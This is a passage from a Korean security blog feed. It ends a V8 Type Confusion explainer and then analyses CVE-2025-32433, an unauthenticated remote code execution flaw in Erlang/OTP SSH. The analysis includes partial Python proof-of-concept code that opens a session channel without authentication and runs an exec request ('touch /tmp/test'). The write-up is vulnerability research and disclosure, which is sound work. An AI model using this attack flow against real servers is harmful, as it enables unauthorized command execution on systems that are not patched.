&#xC131;&#xB2A5; &#xD29C;&#xB2DD; &#xC5C6;&#xC774;&#xB3C4; &#xC720;&#xC5F0;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%2015.png" alt="image.png"></p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB807;&#xAC8C; &#xC815;&#xAD50;&#xD55C; &#xC2E4;&#xD589; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC740; &#xB3D9;&#xC2DC;&#xC5D0; <strong>&#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xAC00;&#xB2A5;&#xC131;</strong>&#xB3C4; &#xB0B4;&#xD3EC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. V8&#xC758; &#xCD5C;&#xC801;&#xD654;&#xB294; &#xB300;&#xBD80;&#xBD84; &#x201C;&#xC774; &#xAC1D;&#xCCB4;&#xB294; &#xC55E;&#xC73C;&#xB85C;&#xB3C4; &#xAC19;&#xC740; &#xAD6C;&#xC870;&#xC77C; &#xAC83;&#xC774;&#xB2E4;&#x201D;, &#x201C;&#xC774; &#xD568;&#xC218;&#xB294; &#xD56D;&#xC0C1; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB420; &#xAC83;&#xC774;&#xB2E4;&#x201D;&#xC640; &#xAC19;&#xC740; &#xAC00;&#xC815;&#xC5D0; &#xAE30;&#xBC18;&#xD558;&#xC5EC; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB7EC;&#xD55C; &#xAC00;&#xC815;&#xC774; &#xAE68;&#xC9C0;&#xB294; &#xC21C;&#xAC04;, V8&#xC740; &#xC798;&#xBABB;&#xB41C; &#xC804;&#xC81C; &#xC704;&#xC5D0;&#xC11C; <strong>&#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774;&#xB098; &#xAC1D;&#xCCB4; &#xD574;&#xC11D;&#xC744; &#xC218;&#xD589;</strong>&#xD558;&#xAC8C; &#xB418;&#xACE0;, &#xBC14;&#xB85C; &#xC774; &#xC9C0;&#xC810;&#xC5D0;&#xC11C; &#xB300;&#xD45C;&#xC801;&#xC778; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC778; <strong>Type Confusion</strong>&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>Type Confusion</strong>&#xC740; &#xB9D0; &#xADF8;&#xB300;&#xB85C;, &#xAC1D;&#xCCB4;&#xB098; &#xAC12;&#xC758; &#xD0C0;&#xC785;&#xC5D0; &#xB300;&#xD574; &#xC5D4;&#xC9C4;&#xC774; &#xC798;&#xBABB;&#xB41C; &#xCD94;&#xB860;&#xC744; &#xC218;&#xD589;&#xD558;&#xAC70;&#xB098;, &#xAE30;&#xC874; &#xAC00;&#xC815;&#xACFC; &#xB2E4;&#xB978; &#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xC804;&#xD658;&#xB418;&#xC5C8;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xCC44; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xCD08;&#xAE30;&#xC5D0;&#xB294; &#xB2E8;&#xC21C;&#xD55C; &#xC815;&#xC218; &#xBC30;&#xC5F4;&#xB85C; &#xCDE8;&#xAE09;&#xB418;&#xB358; &#xAC1D;&#xCCB4;&#xAC00; &#xB7F0;&#xD0C0;&#xC784; &#xB3C4;&#xC911; &#xBCF5;&#xC7A1;&#xD55C; &#xAC1D;&#xCCB4; &#xBC30;&#xC5F4;&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xC74C;&#xC5D0;&#xB3C4;, V8&#xC774; &#xC5EC;&#xC804;&#xD788; &#xC774;&#xB97C; &#xC815;&#xC218; &#xBC30;&#xC5F4;&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xACE0; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xBA74;, &#xC774;&#xB294; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xCC38;&#xC870;&#xB098; &#xB0B4;&#xBD80; &#xAD6C;&#xC870; &#xC190;&#xC0C1;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xC0C1;&#xD669;&#xC740; &#xD2B9;&#xD788; TurboFan&#xC774;&#xB098; Maglev&#xC640; &#xAC19;&#xC740; &#xACE0;&#xAE09; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xC218;&#xD589;&#xD558;&#xB294; &#xD0C0;&#xC785; &#xD2B9;&#xD654;(type specialization), &#xC778;&#xB77C;&#xC774;&#xB2DD;(inlining), &#xAC1D;&#xCCB4; &#xAD6C;&#xC870; &#xACE0;&#xC815;(hidden class assumption) &#xB4F1;&#xC758; &#xCD5C;&#xC801;&#xD654; &#xC911;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC131;&#xB2A5;&#xC744; &#xADF9;&#xB300;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD0C0;&#xC785;&#xC774;&#xB098; &#xAD6C;&#xC870;&#xB97C; &#xACE0;&#xC815;&#xD55C; &#xCC44; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAC8C; &#xB418;&#xBA74;, &#xADF8; &#xC774;&#xD6C4;&#xC758; &#xC608;&#xC678;&#xC801;&#xC778; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC774;&#xB098; &#xAD6C;&#xC870; &#xBCC0;&#xD654;&#xB294; &#xACE0;&#xB824;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xCDE8;&#xC57D;&#xD55C; &#xC9C0;&#xC810;&#xC774; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC77C;&#xBD80; &#xD568;&#xC218;&#xB97C; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC5D4;&#xC9C4;&#xC774; &#xD574;&#xB2F9; &#xD328;&#xD134;&#xC744; &#x201C;&#xC548;&#xC804;&#xD558;&#xB2E4;&#x201D;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E0; &#xB4A4;, <strong>&#xD2B9;&#xC815; &#xC2DC;&#xC810;&#xC5D0; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xD0C0;&#xC785;&#xC774;&#xB098; &#xAD6C;&#xC870;&#xB97C; &#xBCC0;&#xC870;</strong>&#xD558;&#xC5EC;, <strong>V8&#xC774; &#xC0DD;&#xC131;&#xD55C; Native Code&#xC758; &#xC798;&#xBABB;&#xB41C; &#xB3D9;&#xC791;</strong>&#xC744; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC2E4;&#xC81C;&#xB85C; &#xB2E4;&#xC218;&#xC758; Chrome &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB41C; &#xBC29;&#xC2DD;&#xC774;&#xBA70;, &#xCD5C;&#xADFC;&#xAE4C;&#xC9C0;&#xB3C4; V8 &#xAE30;&#xBC18; Type Confusion &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xACE0;&#xC704;&#xD5D8;&#xAD70;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xACF5;&#xACA9; &#xBCA1;&#xD130;&#xB85C; &#xBD84;&#xB958;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xC81C; V8 &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xC9C0; &#xAE30;&#xBCF8; &#xAD6C;&#xC870;&#xB97C; &#xC774;&#xD574;&#xD588;&#xC73C;&#xB2C8;, &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xC5D4;&#xC9C4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xD45C;&#xD604;&#xB418;&#xACE0;, &#xCD5C;&#xC801;&#xD654;&#xB418;&#xBA70;, &#xB098;&#xC544;&#xAC00; &#xC774; &#xAD6C;&#xC870;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; <strong>Type Confusion</strong>&#xACFC; &#xAC19;&#xC740; &#xBCF4;&#xC548; &#xC774;&#xC288;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xD55C;&#xD638;&#xD761; &#xB04A;&#xACE0; &#xAC00;&#xB294;&#xAC8C; &#xC88B;&#xACA0;&#xC8E0;? &#x314E;.&#x314E; &#xADF8;&#xB7FC; &#xB2E4;&#xC74C;&#xD3B8;&#xC744; &#xC608;&#xACE0;&#xD558;&#xBA70; &#xC800;&#xB294; Part 2&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Part 2 &#xC608;&#xACE0;)</li></ul><p><img src="image%2016.png" alt="image.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>v <strong>Conference Video</strong></p><ul><li><a href="https://www.youtube.com/watch?v=RL2po1swXO4">https://www.youtube.com/watch?v=RL2po1swXO4</a></li></ul><p>v <strong>V8 Engine</strong></p><ul><li><a href="https://v8.dev/">https://v8.dev/</a></li><li><a href="https://en.wikipedia.org/wiki/V8_(JavaScript_engine">https://en.wikipedia.org/wiki/V8_(JavaScript_engine</a>)</li><li><a href="https://evan-moon.github.io/2019/06/28/v8-analysis/">https://evan-moon.github.io/2019/06/28/v8-analysis/</a></li><li><a href="https://blog.bitsrc.io/secret-behind-javascript-performance-v8-hidden-classes-ba4d0ebfb89d">https://blog.bitsrc.io/secret-behind-javascript-performance-v8-hidden-classes-ba4d0ebfb89d</a></li><li><a href="https://medium.com/@yanguly/sparkplug-v8-baseline-javascript-compiler-758a7bc96e84">https://medium.com/@yanguly/sparkplug-v8-baseline-javascript-compiler-758a7bc96e84</a></li><li><a href="https://pks2974.medium.com/v8-%EC%97%90%EC%84%9C-javascript-%EC%BD%94%EB%93%9C%EB%A5%BC-%EC%8B%A4%ED%96%89%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95-%EC%A0%95%EB%A6%AC%ED%95%B4%EB%B3%B4%EA%B8%B0-25837f61f551">https://pks2974.medium.com/v8-%EC%97%90%EC%84%9C-javascript-%EC%BD%94%EB%93%9C%EB%A5%BC-%EC%8B%A4%ED%96%89%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95-%EC%A0%95%EB%A6%AC%ED%95%B4%EB%B3%B4%EA%B8%B0-25837f61f551</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion-101/">Type Confusion 101</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome/">Chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chromium/">Chromium</category>
      
      <category domain="https://hackyboiz.github.io/tags/Chrome-internal/">Chrome internal</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE‑2025‑32433: Erlang/OTP SSH의 Pre-auth RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/06/28/bekim/2025-06-28/</link>
      <guid>https://hackyboiz.github.io/2025/06/28/bekim/2025-06-28/</guid>
      <pubDate>Sat, 28 Jun 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-32433&quot;&gt;ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32433">https://nvd.nist.gov/vuln/detail/CVE-2025-32433</a></li><li><a href="https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce">https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OTP 25 &#x2264; 25.3.2.19</li><li>OTP 26 &#x2264; 26.2.5.10</li><li>OTP 27 &#x2264; 27.3.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Erlang OTP&#xB294; Open Telecom Platform&#xC758; &#xC57D;&#xC790;&#xB85C;, Erlang&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC2E4;&#xC2DC;&#xAC04; &#xC11C;&#xBC84;&#xB098; &#xBA54;&#xC2DC;&#xC9D5; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xAC1C;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xD50C;&#xB7AB;&#xD3FC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Erlang/OTP&#xC758; SSH &#xC11C;&#xBC84; &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Pre-auth RCE(Remote Code Execution) &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xC778;&#xC99D; &#xC808;&#xCC28; &#xC774;&#xC804;&#xC5D0; SSH &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC798;&#xBABB; &#xCC98;&#xB9AC;&#xD558;&#xC5EC; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; SSH &#xC5F0;&#xACB0; &#xC2DC;, &#xC778;&#xC99D; &#xC774;&#xD6C4;&#xC5D0;&#xB9CC; &#xC804;&#xC1A1;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xB294; <code>SSH_MSG-CHANNEL_OPEN</code>(message number 90)&#xACFC; <code>SSH_MSG_CHANNEL_REQUEST</code>(message number 98) &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>SSH_MSG-CHANNEL_OPEN</code> &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC778;&#xC99D;&#xC744; &#xC644;&#xB8CC;&#xD55C; &#xD6C4; &#xC138;&#xC158; &#xCC44;&#xB110;&#xC744; &#xC5F4;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, <code>SSH_MSG_CHANNEL_REQUEST</code>&#xB294; &#xC5F4;&#xB9B0; &#xCC44;&#xB110;&#xC744; &#xD1B5;&#xD574; &#xBA85;&#xB839; &#xC2E4;&#xD589; &#xB4F1;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>SSH &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBA85;&#xC138;(<a href="https://datatracker.ietf.org/doc/html/rfc4254">RFC 4254</a>)&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB4E4;&#xC740; &#xC778;&#xC99D; &#xC774;&#xD6C4;&#xC5D0;&#xB9CC; &#xD5C8;&#xC6A9;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xACE0;, &#xC774;&#xB974;&#xAC8C; &#xC804;&#xC1A1;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC138;&#xC158; &#xC885;&#xB8CC;&#xB85C; &#xCC98;&#xB9AC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Erlang/OTP&#xC5D0;&#xC11C; SSH &#xB370;&#xBAAC;&#xC774; &#xC774; &#xADDC;&#xCE59;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC778;&#xC99D; &#xC5C6;&#xC774;&#xB3C4; &#xC138;&#xC158; &#xCC44;&#xB110;&#xC744; &#xC5F4;&#xACE0;, exec &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Attack-Flow"><a href="#Attack-Flow" class="headerlink" title="Attack Flow"></a>Attack Flow</h3><p>&#xC544;&#xB798;&#xB294; &#xACF5;&#xAC1C;&#xB41C; PoC &#xCF54;&#xB4DC;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD55C; &#xACF5;&#xACA9; &#xD750;&#xB984;&#xC785;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC11C;&#xBC84;&#xAC00; SSH &#xC138;&#xC158;&#xC744; &#xC2DC;&#xC791;&#xD560; &#xB54C; &#xC11C;&#xB85C;&#xC758; &#xBC84;&#xC804; &#xC815;&#xBCF4;&#xB97C; &#xAD50;&#xD658;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD638;&#xD658;&#xC131;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; SSH-2.0-OpenSSH_8.9 &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC11C;&#xBC84;&#xC640; &#xAD50;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs python">s.sendall(<span class="hljs-string">b&quot;SSH-2.0-OpenSSH_8.9\r\n&quot;</span>)banner = s.recv(<span class="hljs-number">1024</span>)</code></pre><ol><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;(&#xACF5;&#xACA9;&#xC790;)&#xB294; SSH_MSG_KEXINIT &#xD328;&#xD0B7;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xD0A4; &#xAD50;&#xD658; &#xACFC;&#xC815;&#xC744; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xB294; &#xD0A4; &#xAD50;&#xD658; &#xBC29;&#xC2DD;, &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;, &#xC555;&#xCD95; &#xC635;&#xC158; &#xB4F1;&#xC758; &#xBAA9;&#xB85D;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_kexinit</span>():</span>    cookie = <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">16</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name_list</span>(<span class="hljs-params">l</span>):</span>        <span class="hljs-keyword">return</span> string_payload(<span class="hljs-string">&quot;,&quot;</span>.join(l))    <span class="hljs-comment"># Match server-supported algorithms from the log</span>    <span class="hljs-keyword">return</span> (        <span class="hljs-string">b&quot;\x14&quot;</span>        + cookie        + name_list(            [                <span class="hljs-string">&quot;curve25519-sha256&quot;</span>,                <span class="hljs-string">&quot;ecdh-sha2-nistp256&quot;</span>,                <span class="hljs-string">&quot;diffie-hellman-group-exchange-sha256&quot;</span>,                <span class="hljs-string">&quot;diffie-hellman-group14-sha256&quot;</span>,            ]        )  <span class="hljs-comment"># kex algorithms</span>        + name_list([<span class="hljs-string">&quot;rsa-sha2-256&quot;</span>, <span class="hljs-string">&quot;rsa-sha2-512&quot;</span>])  <span class="hljs-comment"># host key algorithms</span>        + name_list([<span class="hljs-string">&quot;aes128-ctr&quot;</span>]) * <span class="hljs-number">2</span>  <span class="hljs-comment"># encryption client-&gt;server, server-&gt;client</span>        + name_list([<span class="hljs-string">&quot;hmac-sha1&quot;</span>]) * <span class="hljs-number">2</span>  <span class="hljs-comment"># MAC algorithms</span>        + name_list([<span class="hljs-string">&quot;none&quot;</span>]) * <span class="hljs-number">2</span>  <span class="hljs-comment"># compression</span>        + name_list([]) * <span class="hljs-number">2</span>  <span class="hljs-comment"># languages</span>        + <span class="hljs-string">b&quot;\x00&quot;</span>        + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># first_kex_packet_follows, reserved</span>    )     ... kex_packet = build_kexinit()s.sendall(pad_packet(kex_packet))</code></pre><ol><li>&#xCD08;&#xAE30; &#xD0A4; &#xAD50;&#xD658;&#xC774; &#xB05D;&#xB098;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xB294; SSH_MSG_CHANNEL_OPEN &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xC138;&#xC158; &#xCC44;&#xB110; &#xC0DD;&#xC131;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; &#xC774; &#xC694;&#xCCAD;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC774; &#xB05D;&#xB09C; &#xD6C4;&#xC5D0;&#xB9CC; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_channel_open</span>(<span class="hljs-params">channel_id=<span class="hljs-number">0</span></span>):</span>    <span class="hljs-keyword">return</span> (        <span class="hljs-string">b&quot;\x5a&quot;</span>  <span class="hljs-comment"># SSH_MSG_CHANNEL_OPEN</span>        + string_payload(<span class="hljs-string">&quot;session&quot;</span>)        + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, channel_id)  <span class="hljs-comment"># sender channel ID</span>        + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0x68000</span>)  <span class="hljs-comment"># initial window size</span>        + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0x10000</span>)  <span class="hljs-comment"># max packet size</span>    )...chan_open = build_channel_open()s.sendall(pad_packet(chan_open))</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; CVE-2025-32433 &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xC11C;&#xBC84;&#xB294; &#xC774; &#xC694;&#xCCAD;&#xC744; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC218;&#xB77D;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;&#xB3C4; &#xCC44;&#xB110;&#xC744; &#xC5F4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xACF5;&#xACA9;&#xC790;&#xB294; SSH_MSG_CHANNEL_REQUEST &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD574;, &#xC5F4;&#xB9B0; &#xCC44;&#xB110;&#xC744; &#xD1B5;&#xD574; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC778;&#xC99D;&#xB41C; &#xC138;&#xC158; &#xB0B4;&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs python">chan_req = build_channel_request(    command=<span class="hljs-string">&apos;os:cmd(&quot;touch /tmp/test&quot;).&apos;</span>)s.sendall(pad_packet(chan_req))</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xC11C;&#xB294; &#xC778;&#xC99D;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xB354;&#xB77C;&#xB3C4; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xB77D;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#x201C;exec&#x201D; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC694;&#xCCAD;&#xC774; &#xD5C8;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC784;&#xC758;&#xC758; &#xC258; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/28/bekim/2025-06-28/image.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; OTP 27.3.3, 26.2.5.11, 25.3.2.20 &#xC774;&#xC0C1; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sonicwall.com/blog/pre-auth-rce-alert-critical-ssh-flaw-in-erlang-otp-cve-2025-32433-">https://www.sonicwall.com/blog/pre-auth-rce-alert-critical-ssh-flaw-in-erlang-otp-cve-2025-32433-</a></p><p><a href="https://github.com/ProDefense/CVE-2025-32433">https://github.com/ProDefense/CVE-2025-32433</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE%E2%80%912025%E2%80%9132433/">CVE‑2025‑32433</category>
      
      <category domain="https://hackyboiz.github.io/tags/Erlang-OTP/">Erlang/OTP</category>
      
